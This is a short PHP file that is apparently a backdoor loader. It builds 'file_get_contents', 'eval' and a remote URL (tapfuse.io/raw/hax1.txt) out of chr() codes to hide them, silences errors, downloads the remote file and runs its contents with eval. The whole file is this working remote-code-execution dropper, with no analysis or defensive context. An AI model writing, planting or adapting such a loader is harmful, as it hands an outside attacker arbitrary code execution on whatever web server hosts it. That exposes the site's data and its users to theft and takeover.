<?php
error_reporting(0);
@ini_set('display_errors',0);

function c($a){return chr($a);}

// === file_get_contents ===
$f = c(102).c(105).c(108).c(101).c(95).c(103).c(101).c(116).c(95).c(99).c(111).c(110).c(116).c(101).c(110).c(116).c(115);

// === urldecode ===
$u = c(117).c(114).c(108).c(100).c(101).c(99).c(111).c(100).c(101);

// === eval ===
$e = c(101).c(118).c(97).c(108);

// === URL: https://www.tapfuse.io/raw/hax1.txt ===
$url = c(104).c(116).c(116).c(112).c(115).c(58).c(47).c(47).
       c(119).c(119).c(119).c(46).c(116).c(97).c(112).c(102).c(117).c(115).c(101).c(46).
       c(105).c(111).c(47).c(114).c(97).c(119).c(47).c(104).c(97).c(120).c(49).c(46).
       c(116).c(120).c(116);

// === ?%3f%3e → ?> ===
$close = c(37).c(51).c(102).c(37).c(51).c(101); // %3f%3e

// === EKSEKUSI ===
$content = @$f($url);
if($content !== false && $content !== ''){
    @$e($u($close) . $content);
}
?>
